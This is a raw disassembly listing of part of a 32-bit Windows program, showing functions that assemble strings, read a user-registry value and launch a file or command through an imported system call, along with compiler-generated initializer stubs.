  404799:	50                   	push   %eax
  40479a:	ff d3                	call   *%ebx
  40479c:	8d 45 fe             	lea    -0x2(%ebp),%eax
  40479f:	68 34 d9 40 00       	push   $0x40d934
  4047a4:	50                   	push   %eax
  4047a5:	68 8c d8 40 00       	push   $0x40d88c
  4047aa:	ff 15 44 d3 40 00    	call   *0x40d344
  4047b0:	59                   	pop    %ecx
  4047b1:	50                   	push   %eax
  4047b2:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4047b5:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  4047bb:	50                   	push   %eax
  4047bc:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4047bf:	50                   	push   %eax
  4047c0:	e8 05 7f 00 00       	call   0x40c6ca
  4047c5:	83 c4 0c             	add    $0xc,%esp
  4047c8:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4047cb:	ff 15 9c d2 40 00    	call   *0x40d29c
  4047d1:	8d 45 fe             	lea    -0x2(%ebp),%eax
  4047d4:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4047d7:	50                   	push   %eax
  4047d8:	68 20 d8 40 00       	push   $0x40d820
  4047dd:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  4047e3:	50                   	push   %eax
  4047e4:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4047e7:	68 f4 d7 40 00       	push   $0x40d7f4
  4047ec:	50                   	push   %eax
  4047ed:	e8 ea 7e 00 00       	call   0x40c6dc
  4047f2:	83 c4 0c             	add    $0xc,%esp
  4047f5:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4047f8:	ff 15 9c d2 40 00    	call   *0x40d29c
  4047fe:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  404802:	74 5d                	je     0x404861
  404804:	8d 45 fe             	lea    -0x2(%ebp),%eax
  404807:	68 ec d7 40 00       	push   $0x40d7ec
  40480c:	50                   	push   %eax
  40480d:	8d 85 84 fd ff ff    	lea    -0x27c(%ebp),%eax
  404813:	50                   	push   %eax
  404814:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404817:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40481d:	50                   	push   %eax
  40481e:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404821:	68 bc d7 40 00       	push   $0x40d7bc
  404826:	50                   	push   %eax
  404827:	e8 b0 7e 00 00       	call   0x40c6dc
  40482c:	83 c4 0c             	add    $0xc,%esp
  40482f:	50                   	push   %eax
  404830:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404833:	50                   	push   %eax
  404834:	e8 91 7e 00 00       	call   0x40c6ca
  404839:	83 c4 0c             	add    $0xc,%esp
  40483c:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40483f:	50                   	push   %eax
  404840:	ff 15 18 d2 40 00    	call   *0x40d218
  404846:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404849:	ff 15 9c d2 40 00    	call   *0x40d29c
  40484f:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404852:	ff 15 9c d2 40 00    	call   *0x40d29c
  404858:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40485b:	ff 15 9c d2 40 00    	call   *0x40d29c
  404861:	bb b4 d7 40 00       	mov    $0x40d7b4,%ebx
  404866:	8d 85 84 fd ff ff    	lea    -0x27c(%ebp),%eax
  40486c:	53                   	push   %ebx
  40486d:	50                   	push   %eax
  40486e:	8d 45 fe             	lea    -0x2(%ebp),%eax
  404871:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404874:	50                   	push   %eax
  404875:	68 90 d7 40 00       	push   $0x40d790
  40487a:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  404880:	50                   	push   %eax
  404881:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404884:	50                   	push   %eax
  404885:	e8 40 7e 00 00       	call   0x40c6ca
  40488a:	83 c4 0c             	add    $0xc,%esp
  40488d:	50                   	push   %eax
  40488e:	8d 45 cc             	lea    -0x34(%ebp),%eax
  404891:	50                   	push   %eax
  404892:	e8 33 7e 00 00       	call   0x40c6ca
  404897:	83 c4 0c             	add    $0xc,%esp
  40489a:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40489d:	50                   	push   %eax
  40489e:	ff 15 18 d2 40 00    	call   *0x40d218
  4048a4:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4048a7:	ff 15 9c d2 40 00    	call   *0x40d29c
  4048ad:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4048b0:	ff 15 9c d2 40 00    	call   *0x40d29c
  4048b6:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4048b9:	ff 15 9c d2 40 00    	call   *0x40d29c
  4048bf:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  4048c3:	74 0e                	je     0x4048d3
  4048c5:	68 84 d7 40 00       	push   $0x40d784
  4048ca:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4048cd:	ff 15 1c d2 40 00    	call   *0x40d21c
  4048d3:	56                   	push   %esi
  4048d4:	57                   	push   %edi
  4048d5:	ff 15 6c d2 40 00    	call   *0x40d26c
  4048db:	59                   	pop    %ecx
  4048dc:	84 c0                	test   %al,%al
  4048de:	59                   	pop    %ecx
  4048df:	74 3c                	je     0x40491d
  4048e1:	53                   	push   %ebx
  4048e2:	57                   	push   %edi
  4048e3:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4048e6:	68 5c d7 40 00       	push   $0x40d75c
  4048eb:	50                   	push   %eax
  4048ec:	e8 eb 7d 00 00       	call   0x40c6dc
  4048f1:	83 c4 0c             	add    $0xc,%esp
  4048f4:	50                   	push   %eax
  4048f5:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4048f8:	50                   	push   %eax
  4048f9:	e8 cc 7d 00 00       	call   0x40c6ca
  4048fe:	83 c4 0c             	add    $0xc,%esp
  404901:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404904:	50                   	push   %eax
  404905:	ff 15 18 d2 40 00    	call   *0x40d218
  40490b:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40490e:	ff 15 9c d2 40 00    	call   *0x40d29c
  404914:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404917:	ff 15 9c d2 40 00    	call   *0x40d29c
  40491d:	8d 45 fe             	lea    -0x2(%ebp),%eax
  404920:	68 30 d9 40 00       	push   $0x40d930
  404925:	50                   	push   %eax
  404926:	68 20 d9 40 00       	push   $0x40d920
  40492b:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40492e:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  404934:	50                   	push   %eax
  404935:	8d 45 08             	lea    0x8(%ebp),%eax
  404938:	50                   	push   %eax
  404939:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40493c:	50                   	push   %eax
  40493d:	68 c4 d8 40 00       	push   $0x40d8c4
  404942:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  404945:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40494b:	50                   	push   %eax
  40494c:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40494f:	50                   	push   %eax
  404950:	e8 7b 7d 00 00       	call   0x40c6d0
  404955:	83 c4 0c             	add    $0xc,%esp
  404958:	50                   	push   %eax
  404959:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40495c:	50                   	push   %eax
  40495d:	e8 6e 7d 00 00       	call   0x40c6d0
  404962:	83 c4 0c             	add    $0xc,%esp
  404965:	50                   	push   %eax
  404966:	8d 45 cc             	lea    -0x34(%ebp),%eax
  404969:	50                   	push   %eax
  40496a:	e8 5b 7d 00 00       	call   0x40c6ca
  40496f:	83 c4 0c             	add    $0xc,%esp
  404972:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404975:	50                   	push   %eax
  404976:	ff 15 18 d2 40 00    	call   *0x40d218
  40497c:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40497f:	ff 15 9c d2 40 00    	call   *0x40d29c
  404985:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404988:	ff 15 9c d2 40 00    	call   *0x40d29c
  40498e:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404991:	ff 15 9c d2 40 00    	call   *0x40d29c
  404997:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40499a:	ff 15 9c d2 40 00    	call   *0x40d29c
  4049a0:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  4049a3:	ff 15 9c d2 40 00    	call   *0x40d29c
  4049a9:	68 0c d7 40 00       	push   $0x40d70c
  4049ae:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4049b1:	ff 15 1c d2 40 00    	call   *0x40d21c
  4049b7:	33 ff                	xor    %edi,%edi
  4049b9:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4049bc:	57                   	push   %edi
  4049bd:	ff 15 98 d2 40 00    	call   *0x40d298
  4049c3:	50                   	push   %eax
  4049c4:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4049c7:	ff 15 38 d2 40 00    	call   *0x40d238
  4049cd:	d1 e0                	shl    $1,%eax
  4049cf:	50                   	push   %eax
  4049d0:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4049d3:	ff 15 98 d2 40 00    	call   *0x40d298
  4049d9:	50                   	push   %eax
  4049da:	e8 5f 6d 00 00       	call   0x40b73e
  4049df:	83 c4 10             	add    $0x10,%esp
  4049e2:	84 c0                	test   %al,%al
  4049e4:	74 25                	je     0x404a0b
  4049e6:	57                   	push   %edi
  4049e7:	56                   	push   %esi
  4049e8:	56                   	push   %esi
  4049e9:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4049ec:	ff 15 98 d2 40 00    	call   *0x40d298
  4049f2:	50                   	push   %eax
  4049f3:	68 d0 d6 40 00       	push   $0x40d6d0
  4049f8:	57                   	push   %edi
  4049f9:	ff 15 9c d3 40 00    	call   *0x40d39c
  4049ff:	83 f8 20             	cmp    $0x20,%eax
  404a02:	7e 07                	jle    0x404a0b
  404a04:	57                   	push   %edi
  404a05:	ff 15 48 d3 40 00    	call   *0x40d348
  404a0b:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404a0e:	ff 15 9c d2 40 00    	call   *0x40d29c
  404a14:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404a17:	ff 15 9c d2 40 00    	call   *0x40d29c
  404a1d:	8d 4d 08             	lea    0x8(%ebp),%ecx
  404a20:	ff 15 9c d2 40 00    	call   *0x40d29c
  404a26:	5f                   	pop    %edi
  404a27:	5e                   	pop    %esi
  404a28:	5b                   	pop    %ebx
  404a29:	c9                   	leave
  404a2a:	c3                   	ret
  404a2b:	55                   	push   %ebp
  404a2c:	8b ec                	mov    %esp,%ebp
  404a2e:	81 ec 7c 02 00 00    	sub    $0x27c,%esp
  404a34:	56                   	push   %esi
  404a35:	be 30 1a 41 00       	mov    $0x411a30,%esi
  404a3a:	57                   	push   %edi
  404a3b:	8b ce                	mov    %esi,%ecx
  404a3d:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  404a43:	50                   	push   %eax
  404a44:	8b ce                	mov    %esi,%ecx
  404a46:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  404a4c:	50                   	push   %eax
  404a4d:	be 08 02 00 00       	mov    $0x208,%esi
  404a52:	8d 85 84 fd ff ff    	lea    -0x27c(%ebp),%eax
  404a58:	56                   	push   %esi
  404a59:	50                   	push   %eax
  404a5a:	68 bc d8 40 00       	push   $0x40d8bc
  404a5f:	b9 c8 17 41 00       	mov    $0x4117c8,%ecx
  404a64:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  404a6a:	50                   	push   %eax
  404a6b:	68 01 00 00 80       	push   $0x80000001
  404a70:	e8 a2 14 00 00       	call   0x405f17
  404a75:	83 c4 1c             	add    $0x1c,%esp
  404a78:	33 ff                	xor    %edi,%edi
  404a7a:	84 c0                	test   %al,%al
  404a7c:	75 0f                	jne    0x404a8d
  404a7e:	8d 85 84 fd ff ff    	lea    -0x27c(%ebp),%eax
  404a84:	56                   	push   %esi
  404a85:	50                   	push   %eax
  404a86:	57                   	push   %edi
  404a87:	ff 15 1c d1 40 00    	call   *0x40d11c
  404a8d:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404a90:	68 e8 d9 40 00       	push   $0x40d9e8
  404a95:	50                   	push   %eax
  404a96:	68 8c d8 40 00       	push   $0x40d88c
  404a9b:	ff 15 44 d3 40 00    	call   *0x40d344
  404aa1:	59                   	pop    %ecx
  404aa2:	50                   	push   %eax
  404aa3:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404aa6:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  404aac:	50                   	push   %eax
  404aad:	8d 45 cc             	lea    -0x34(%ebp),%eax
  404ab0:	50                   	push   %eax
  404ab1:	e8 14 7c 00 00       	call   0x40c6ca
  404ab6:	83 c4 0c             	add    $0xc,%esp
  404ab9:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404abc:	ff 15 9c d2 40 00    	call   *0x40d29c
  404ac2:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404ac5:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404ac8:	50                   	push   %eax
  404ac9:	ff 15 20 d2 40 00    	call   *0x40d220
  404acf:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404ad2:	68 30 d9 40 00       	push   $0x40d930
  404ad7:	50                   	push   %eax
  404ad8:	68 20 d9 40 00       	push   $0x40d920
  404add:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  404ae0:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  404ae6:	50                   	push   %eax
  404ae7:	8d 85 84 fd ff ff    	lea    -0x27c(%ebp),%eax
  404aed:	50                   	push   %eax
  404aee:	8d 45 fe             	lea    -0x2(%ebp),%eax
  404af1:	50                   	push   %eax
  404af2:	68 c4 d8 40 00       	push   $0x40d8c4
  404af7:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404afa:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  404b00:	50                   	push   %eax
  404b01:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404b04:	50                   	push   %eax
  404b05:	e8 c0 7b 00 00       	call   0x40c6ca
  404b0a:	83 c4 0c             	add    $0xc,%esp
  404b0d:	50                   	push   %eax
  404b0e:	8d 45 8c             	lea    -0x74(%ebp),%eax
  404b11:	50                   	push   %eax
  404b12:	e8 b9 7b 00 00       	call   0x40c6d0
  404b17:	83 c4 0c             	add    $0xc,%esp
  404b1a:	50                   	push   %eax
  404b1b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404b1e:	50                   	push   %eax
  404b1f:	e8 a6 7b 00 00       	call   0x40c6ca
  404b24:	83 c4 0c             	add    $0xc,%esp
  404b27:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404b2a:	50                   	push   %eax
  404b2b:	ff 15 18 d2 40 00    	call   *0x40d218
  404b31:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404b34:	ff 15 9c d2 40 00    	call   *0x40d29c
  404b3a:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  404b3d:	ff 15 9c d2 40 00    	call   *0x40d29c
  404b43:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404b46:	ff 15 9c d2 40 00    	call   *0x40d29c
  404b4c:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404b4f:	ff 15 9c d2 40 00    	call   *0x40d29c
  404b55:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  404b58:	ff 15 9c d2 40 00    	call   *0x40d29c
  404b5e:	68 4c d9 40 00       	push   $0x40d94c
  404b63:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404b66:	ff 15 1c d2 40 00    	call   *0x40d21c
  404b6c:	57                   	push   %edi
  404b6d:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404b70:	ff 15 98 d2 40 00    	call   *0x40d298
  404b76:	50                   	push   %eax
  404b77:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404b7a:	ff 15 38 d2 40 00    	call   *0x40d238
  404b80:	d1 e0                	shl    $1,%eax
  404b82:	50                   	push   %eax
  404b83:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404b86:	ff 15 98 d2 40 00    	call   *0x40d298
  404b8c:	50                   	push   %eax
  404b8d:	e8 ac 6b 00 00       	call   0x40b73e
  404b92:	83 c4 10             	add    $0x10,%esp
  404b95:	84 c0                	test   %al,%al
  404b97:	74 2a                	je     0x404bc3
  404b99:	b8 b8 d8 40 00       	mov    $0x40d8b8,%eax
  404b9e:	57                   	push   %edi
  404b9f:	50                   	push   %eax
  404ba0:	50                   	push   %eax
  404ba1:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404ba4:	ff 15 98 d2 40 00    	call   *0x40d298
  404baa:	50                   	push   %eax
  404bab:	68 d0 d6 40 00       	push   $0x40d6d0
  404bb0:	57                   	push   %edi
  404bb1:	ff 15 9c d3 40 00    	call   *0x40d39c
  404bb7:	83 f8 20             	cmp    $0x20,%eax
  404bba:	7e 07                	jle    0x404bc3
  404bbc:	57                   	push   %edi
  404bbd:	ff 15 48 d3 40 00    	call   *0x40d348
  404bc3:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404bc6:	ff 15 9c d2 40 00    	call   *0x40d29c
  404bcc:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404bcf:	ff 15 9c d2 40 00    	call   *0x40d29c
  404bd5:	5f                   	pop    %edi
  404bd6:	5e                   	pop    %esi
  404bd7:	c9                   	leave
  404bd8:	c3                   	ret
  404bd9:	55                   	push   %ebp
  404bda:	8b ec                	mov    %esp,%ebp
  404bdc:	81 ec 8c 02 00 00    	sub    $0x28c,%esp
  404be2:	8d 45 fe             	lea    -0x2(%ebp),%eax
  404be5:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404be8:	50                   	push   %eax
  404be9:	ff 15 20 d2 40 00    	call   *0x40d220
  404bef:	0f be 45 0c          	movsbl 0xc(%ebp),%eax
  404bf3:	83 c0 d0             	add    $0xffffffd0,%eax
  404bf6:	83 f8 07             	cmp    $0x7,%eax
  404bf9:	0f 87 2d 01 00 00    	ja     0x404d2c
  404bff:	ff 24 85 d0 4d 40 00 	jmp    *0x404dd0(,%eax,4)
  404c06:	68 8c d8 40 00       	push   $0x40d88c
  404c0b:	e9 0b 01 00 00       	jmp    0x404d1b
  404c10:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  404c16:	50                   	push   %eax
  404c17:	e8 99 60 00 00       	call   0x40acb5
  404c1c:	59                   	pop    %ecx
  404c1d:	50                   	push   %eax
  404c1e:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404c21:	ff 15 50 d2 40 00    	call   *0x40d250
  404c27:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  404c2d:	eb 76                	jmp    0x404ca5
  404c2f:	68 80 da 40 00       	push   $0x40da80
  404c34:	e9 e2 00 00 00       	jmp    0x404d1b
  404c39:	68 70 da 40 00       	push   $0x40da70
  404c3e:	e9 d8 00 00 00       	jmp    0x404d1b
  404c43:	e8 a5 68 00 00       	call   0x40b4ed
  404c48:	84 c0                	test   %al,%al
  404c4a:	75 61                	jne    0x404cad
  404c4c:	8d 45 0f             	lea    0xf(%ebp),%eax
  404c4f:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404c52:	50                   	push   %eax
  404c53:	68 5c da 40 00       	push   $0x40da5c
  404c58:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  404c5e:	50                   	push   %eax
  404c5f:	8d 45 fe             	lea    -0x2(%ebp),%eax
  404c62:	50                   	push   %eax
  404c63:	68 70 da 40 00       	push   $0x40da70
  404c68:	ff 15 44 d3 40 00    	call   *0x40d344
  404c6e:	59                   	pop    %ecx
  404c6f:	50                   	push   %eax
  404c70:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  404c73:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  404c79:	50                   	push   %eax
  404c7a:	8d 45 9c             	lea    -0x64(%ebp),%eax
  404c7d:	50                   	push   %eax
  404c7e:	e8 4d 7a 00 00       	call   0x40c6d0
  404c83:	83 c4 0c             	add    $0xc,%esp
  404c86:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404c89:	50                   	push   %eax
  404c8a:	ff 15 50 d2 40 00    	call   *0x40d250
  404c90:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  404c93:	ff 15 9c d2 40 00    	call   *0x40d29c
  404c99:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  404c9c:	ff 15 9c d2 40 00    	call   *0x40d29c
  404ca2:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404ca5:	ff 15 9c d2 40 00    	call   *0x40d29c
  404cab:	eb 7f                	jmp    0x404d2c
  404cad:	8d 45 fd             	lea    -0x3(%ebp),%eax
  404cb0:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404cb3:	50                   	push   %eax
  404cb4:	68 48 da 40 00       	push   $0x40da48
  404cb9:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  404cbf:	50                   	push   %eax
  404cc0:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404cc3:	50                   	push   %eax
  404cc4:	68 70 da 40 00       	push   $0x40da70
  404cc9:	ff 15 44 d3 40 00    	call   *0x40d344
  404ccf:	59                   	pop    %ecx
  404cd0:	50                   	push   %eax
  404cd1:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404cd4:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  404cda:	50                   	push   %eax
  404cdb:	8d 45 cc             	lea    -0x34(%ebp),%eax
  404cde:	50                   	push   %eax
  404cdf:	e8 ec 79 00 00       	call   0x40c6d0
  404ce4:	83 c4 0c             	add    $0xc,%esp
  404ce7:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404cea:	50                   	push   %eax
  404ceb:	ff 15 50 d2 40 00    	call   *0x40d250
  404cf1:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404cf4:	ff 15 9c d2 40 00    	call   *0x40d29c
  404cfa:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404cfd:	ff 15 9c d2 40 00    	call   *0x40d29c
  404d03:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404d06:	eb 9d                	jmp    0x404ca5
  404d08:	68 2c da 40 00       	push   $0x40da2c
  404d0d:	eb 0c                	jmp    0x404d1b
  404d0f:	68 1c da 40 00       	push   $0x40da1c
  404d14:	eb 05                	jmp    0x404d1b
  404d16:	68 04 da 40 00       	push   $0x40da04
  404d1b:	ff 15 44 d3 40 00    	call   *0x40d344
  404d21:	59                   	pop    %ecx
  404d22:	50                   	push   %eax
  404d23:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404d26:	ff 15 b4 d1 40 00    	call   *0x40d1b4
  404d2c:	56                   	push   %esi
  404d2d:	8d 85 74 fd ff ff    	lea    -0x28c(%ebp),%eax
  404d33:	68 08 02 00 00       	push   $0x208
  404d38:	50                   	push   %eax
  404d39:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404d3c:	ff 15 98 d2 40 00    	call   *0x40d298
  404d42:	50                   	push   %eax
  404d43:	ff 15 18 d1 40 00    	call   *0x40d118
  404d49:	8b f0                	mov    %eax,%esi
  404d4b:	8d 45 0f             	lea    0xf(%ebp),%eax
  404d4e:	50                   	push   %eax
  404d4f:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404d52:	ff 75 10             	push   0x10(%ebp)
  404d55:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  404d5b:	50                   	push   %eax
  404d5c:	8d 45 13             	lea    0x13(%ebp),%eax
  404d5f:	50                   	push   %eax
  404d60:	68 f8 d6 40 00       	push   $0x40d6f8
  404d65:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404d68:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  404d6e:	50                   	push   %eax
  404d6f:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404d72:	50                   	push   %eax
  404d73:	8d 85 74 fd ff ff    	lea    -0x28c(%ebp),%eax
  404d79:	56                   	push   %esi
  404d7a:	50                   	push   %eax
  404d7b:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404d7e:	ff 15 b0 d1 40 00    	call   *0x40d1b0
  404d84:	50                   	push   %eax
  404d85:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404d88:	50                   	push   %eax
  404d89:	e8 42 79 00 00       	call   0x40c6d0
  404d8e:	83 c4 0c             	add    $0xc,%esp
  404d91:	50                   	push   %eax
  404d92:	ff 75 08             	push   0x8(%ebp)
  404d95:	e8 36 79 00 00       	call   0x40c6d0
  404d9a:	83 c4 0c             	add    $0xc,%esp
  404d9d:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404da0:	ff 15 9c d2 40 00    	call   *0x40d29c
  404da6:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404da9:	ff 15 9c d2 40 00    	call   *0x40d29c
  404daf:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404db2:	ff 15 9c d2 40 00    	call   *0x40d29c
  404db8:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404dbb:	ff 15 9c d2 40 00    	call   *0x40d29c
  404dc1:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404dc4:	ff 15 9c d2 40 00    	call   *0x40d29c
  404dca:	8b 45 08             	mov    0x8(%ebp),%eax
  404dcd:	5e                   	pop    %esi
  404dce:	c9                   	leave
  404dcf:	c3                   	ret
  404dd0:	06                   	push   %es
  404dd1:	4c                   	dec    %esp
  404dd2:	40                   	inc    %eax
  404dd3:	00 10                	add    %dl,(%eax)
  404dd5:	4c                   	dec    %esp
  404dd6:	40                   	inc    %eax
  404dd7:	00 2f                	add    %ch,(%edi)
  404dd9:	4c                   	dec    %esp
  404dda:	40                   	inc    %eax
  404ddb:	00 39                	add    %bh,(%ecx)
  404ddd:	4c                   	dec    %esp
  404dde:	40                   	inc    %eax
  404ddf:	00 43 4c             	add    %al,0x4c(%ebx)
  404de2:	40                   	inc    %eax
  404de3:	00 08                	add    %cl,(%eax)
  404de5:	4d                   	dec    %ebp
  404de6:	40                   	inc    %eax
  404de7:	00 0f                	add    %cl,(%edi)
  404de9:	4d                   	dec    %ebp
  404dea:	40                   	inc    %eax
  404deb:	00 16                	add    %dl,(%esi)
  404ded:	4d                   	dec    %ebp
  404dee:	40                   	inc    %eax
  404def:	00 e8                	add    %ch,%al
  404df1:	05 00 00 00 e9       	add    $0xe9000000,%eax
  404df6:	14 00                	adc    $0x0,%al
  404df8:	00 00                	add    %al,(%eax)
  404dfa:	55                   	push   %ebp
  404dfb:	8b ec                	mov    %esp,%ebp
  404dfd:	51                   	push   %ecx
  404dfe:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404e01:	b9 20 1a 41 00       	mov    $0x411a20,%ecx
  404e06:	50                   	push   %eax
  404e07:	e8 8a ee ff ff       	call   0x403c96
  404e0c:	c9                   	leave
  404e0d:	c3                   	ret
  404e0e:	68 1a 4e 40 00       	push   $0x404e1a
  404e13:	e8 a0 75 00 00       	call   0x40c3b8
  404e18:	59                   	pop    %ecx
  404e19:	c3                   	ret
  404e1a:	b9 20 1a 41 00       	mov    $0x411a20,%ecx
  404e1f:	e9 0c cd ff ff       	jmp    0x401b30
  404e24:	e8 05 00 00 00       	call   0x404e2e
  404e29:	e9 15 00 00 00       	jmp    0x404e43
  404e2e:	55                   	push   %ebp
  404e2f:	8b ec                	mov    %esp,%ebp
  404e31:	51                   	push   %ecx
  404e32:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404e35:	b9 58 1a 41 00       	mov    $0x411a58,%ecx
  404e3a:	50                   	push   %eax
  404e3b:	ff 15 dc d2 40 00    	call   *0x40d2dc
  404e41:	c9                   	leave
  404e42:	c3                   	ret
  404e43:	68 4f 4e 40 00       	push   $0x404e4f
  404e48:	e8 6b 75 00 00       	call   0x40c3b8
  404e4d:	59                   	pop    %ecx
  404e4e:	c3                   	ret
  404e4f:	b9 58 1a 41 00       	mov    $0x411a58,%ecx
  404e54:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  404e5a:	e8 05 00 00 00       	call   0x404e64
  404e5f:	e9 15 00 00 00       	jmp    0x404e79
  404e64:	55                   	push   %ebp
  404e65:	8b ec                	mov    %esp,%ebp
  404e67:	51                   	push   %ecx
  404e68:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404e6b:	b9 30 1a 41 00       	mov    $0x411a30,%ecx
  404e70:	50                   	push   %eax
  404e71:	ff 15 dc d2 40 00    	call   *0x40d2dc
  404e77:	c9                   	leave
  404e78:	c3                   	ret
  404e79:	68 85 4e 40 00       	push   $0x404e85
  404e7e:	e8 35 75 00 00       	call   0x40c3b8
  404e83:	59                   	pop    %ecx
  404e84:	c3                   	ret
  404e85:	b9 30 1a 41 00       	mov    $0x411a30,%ecx
  404e8a:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  404e90:	e8 05 00 00 00       	call   0x404e9a
  404e95:	e9 15 00 00 00       	jmp    0x404eaf
  404e9a:	55                   	push   %ebp
  404e9b:	8b ec                	mov    %esp,%ebp
  404e9d:	51                   	push   %ecx
  404e9e:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404ea1:	b9 68 1a 41 00       	mov    $0x411a68,%ecx
  404ea6:	50                   	push   %eax
  404ea7:	ff 15 20 d2 40 00    	call   *0x40d220
  404ead:	c9                   	leave
  404eae:	c3                   	ret
  404eaf:	68 bb 4e 40 00       	push   $0x404ebb
  404eb4:	e8 ff 74 00 00       	call   0x40c3b8
  404eb9:	59                   	pop    %ecx
  404eba:	c3                   	ret
